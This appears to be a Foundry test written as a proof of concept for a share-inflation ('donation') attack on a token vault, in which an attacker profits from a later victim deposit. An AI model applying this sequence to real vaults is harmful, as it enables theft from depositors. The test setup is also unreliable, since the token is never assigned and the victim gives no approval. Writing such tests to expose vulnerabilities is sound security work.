// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Vault} from "src/Vault.sol";
import {IERC20} from "src/interfaces/IERC20.sol";

contract DonationTest is Test {
    Vault vault;
    IERC20 token;
    address admin = makeAddr("admin");
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        vault = new Vault(admin, address(token));
        deal(address(token), victim, 100e18);
    }

    function test_donationInflatesShares() public {
        vm.prank(attacker);
        vault.deposit(1, attacker);
        deal(address(token), address(vault), 1_000e18);

        vm.prank(victim);
        vault.deposit(100e18, victim);

        uint256 before = token.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);
        assertGt(token.balanceOf(attacker), before);
    }
}
